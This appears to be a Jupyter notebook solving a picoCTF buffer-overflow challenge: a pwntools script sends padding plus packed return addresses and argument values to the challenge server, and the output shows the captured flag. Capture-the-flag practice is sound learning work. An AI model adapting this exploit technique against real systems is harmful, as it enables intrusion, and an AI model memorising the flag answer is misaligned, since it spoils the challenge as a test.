{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[x] Opening connection to saturn.picoctf.net on port 64223\n",
      "[x] Opening connection to saturn.picoctf.net on port 64223: Trying 13.59.203.175\n",
      "[+] Opening connection to saturn.picoctf.net on port 64223: Done\n",
      "[x] Receiving all data\n",
      "[x] Receiving all data: 1B\n",
      "[x] Receiving all data: 130B\n",
      "[x] Receiving all data: 164B\n",
      "[+] Receiving all data: Done (164B)\n",
      "[*] Closed connection to saturn.picoctf.net port 64223\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "b'\\nflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag\\x9a\\x92\\x04\\x08\\xeb\\x93\\x04\\x08\\r\\xf0\\xfe\\xca\\r\\xf0\\r\\xf0\\npicoCTF{argum3nt5_4_d4yZ_59cd5643}'"
      ]
     },
     "execution_count": 1,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from pwn import ELF, context, remote, FmtStr, fmtstr_payload, p32\n",
    "import re\n",
    "r = remote('saturn.picoctf.net', 64223)\n",
    "r.recvuntil(b'Please enter your string: ')\n",
    "r.sendline(b\"flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag\"+p32(0x0804929a)+p32(0x080493eb)+p32(0xCAFEF00D)+p32(0xF00DF00D))\n",
    "r.recvall()"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".venv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
